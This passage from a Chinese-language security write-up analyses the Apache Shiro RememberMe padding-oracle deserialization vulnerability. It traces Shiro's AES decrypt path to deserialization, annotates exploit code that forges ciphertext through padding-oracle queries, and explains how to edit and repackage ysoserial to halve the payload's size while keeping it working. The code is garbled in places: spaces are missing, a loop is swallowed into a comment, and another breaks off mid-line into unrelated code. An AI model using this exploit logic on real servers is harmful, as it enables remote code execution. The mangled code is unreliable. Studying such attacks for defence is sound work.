    }
getCipherService()是返回了CipherService实例
该实例在被初始化的时候就已经确定为AES实例
并在getCipherService()返回不为空，调用this.decrypt()
再跟进后发现进入了JcaCipherService的decrypt方法
    public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException {
    byte[] encrypted = ciphertext;
    //No IV, check if we need to read the IV from the stream:
    byte[] iv = null;
    if (isGenerateInitializationVectors(false)) {
    try {
    //We are generating IVs, so the ciphertext argument array is not actually 100% cipher text. Instead, it
    //is:
    // - the first N bytes is the initialization vector, where N equals the value of the
    // 'initializationVectorSize' attribute.
    // - the remaining bytes in the method argument (arg.length - N) is the real cipher text.
    //So we need to chunk the method argument into its constituent parts to find the IV and then use
    //the IV to decrypt the real ciphertext:
    int ivSize = getInitializationVectorSize();
    int ivByteSize = ivSize / BITS_PER_BYTE;
    //now we know how large the iv is, so extract the iv bytes:
    iv = new byte[ivByteSize];
    System.arraycopy(ciphertext, 0, iv, 0, ivByteSize);
    //remaining data is the actual encrypted ciphertext. Isolate it:
    int encryptedSize = ciphertext.length - ivByteSize;
    encrypted = new byte[encryptedSize];
    System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize);
    } catch (Exception e) {
    String msg = "Unable to correctly extract the Initialization Vector or ciphertext.";
    throw new CryptoException(msg, e);
    }
    }
    return decrypt(encrypted, key, iv);
    }
其中ivSize是128，BITS_PER_BYTE是8，所以iv的长度就是16
并且将数组的前16为取作为IV，然后再传入下一个解密方法
    private ByteSource decrypt(byte[] ciphertext, byte[] key, byte[] iv) throws CryptoException {
    if (log.isTraceEnabled()) {
    log.trace("Attempting to decrypt incoming byte array of length " +
    (ciphertext != null ? ciphertext.length : 0));
    }
    byte[] decrypted = crypt(ciphertext, key, iv, javax.crypto.Cipher.DECRYPT_MODE);
    return decrypted == null ? null : ByteSource.Util.bytes(decrypted);
    }
这里的crypt方法会检测填充是否正确
将处理后的数据一步步返回给convertBytesToPrincipals方法中的deserialize(bytes)
其实就是org.apache.shiro.io.DefaultSerializer的deserialize方法
造成最终的反序列化漏洞。
### **六、利用代码分析**
我本来想直接贴代码注释的，但是想了想，不如用图文并茂的方式来呈现。更能让读者理解，同时也能激发读者的空间想象力带入到程序的运行步骤中。
就先从encrypt方法开始吧
    public String encrypt(byte[] nextBLock) throws Exception {
    logger.debug("Start encrypt data...");
    byte[][] plainTextBlocks = ArrayUtil.splitBytes(this.plainText, this.blockSize); //按blocksize大小分割plainText
    if (nextBLock == null || nextBLock.length == 0 || nextBLock.length != this.blockSize) {
    logger.warn("You provide block's size is not equal blockSize,try to reset it...");
    nextBLock = new byte[this.blockSize];
    }
    byte randomByte = (byte) (new Random()).nextInt(127);
    Arrays.fill(nextBLock, randomByte);
    byte[] result = nextBLock;
    byte[][] reverseplainTextBlocks = ArrayUtil.reverseTwoDimensionalBytesArray(plainTextBlocks);//反转数组顺序
    this.encryptBlockCount = reverseplainTextBlocks.length;
    logger.info(String.format("Total %d blocks to encrypt", this.encryptBlockCount));
    for (byte[] plainTextBlock : reverseplainTextBlocks) {
    nextBLock = this.getBlockEncrypt(plainTextBlock, nextBLock); //加密块，
    result = ArrayUtil.mergerArray(nextBLock, result); //result中容纳每次加密后的内容
    this.encryptBlockCount -= 1;
    logger.info(String.format("Left %d blocks to encrypt", this.encryptBlockCount));
    }
    logger.info(String.format("Generate payload success, send request count => %s", this.requestCount));
    return Base64.getEncoder().encodeToString(result);
    }
传进来的参数是null，所以nextBLock的值是由random伪随机函数生成的，然后反转数组中的顺序
这里将分好块的payload带入到getBlockEncrypt方法中
    privatebyte[] getBlockEncrypt(byte[] PlainTextBlock, byte[] nextCipherTextBlock) throws Exception {
    byte[] tmpIV = newbyte[this.blockSize];
    byte[] encrypt = newbyte[this.blockSize];
    Arrays.fill(tmpIV, (byte) 0); //初始化tmpIVfor (int index = this.blockSize - 1; index >= 0; index--) {
    tmpIV[index] = this.findCharacterEncrypt(index, tmpIV, nextCipherTextBlock); //函数返回测试成功后的中间值
    logger.debug(String.format("Current string => %s, the %d block", ArrayUtil.bytesToHex(ArrayUtil.mergerArray(tmpIV, nextCipherTextBlock)), this.encryptBlockCount));
    }
    for (int index = 0; index 
只需要将下述代码更改(注释是需要更改的代码)
    publicstaticclass StubTransletPayload {}
    /*
    *PayloadMini
    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
    private static final long serialVersionUID = -5971610431559700674L;
    public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
    @Override
    public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }
    */
    Reflections.setFieldValue(templates, "_bytecodes", newbyte[][] {classBytes});
    /*
    *PayloadMini
    Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
    classBytes, ClassFiles.classAsBytes(Foo.class)
    });
    */
然后重写打包yaoserial生成之前的payload
字节：2787kb -> 1402kb
直接从175块瘦身到了88块！
同时payload也能成功运行！
### **Reference：**
  1. 
  2. 
  3. 
  4. 
  5. 《白帽子讲Web安全》，吴翰清著
  6. 
  7. 
  8. 
  9. 
  10. 
  11. 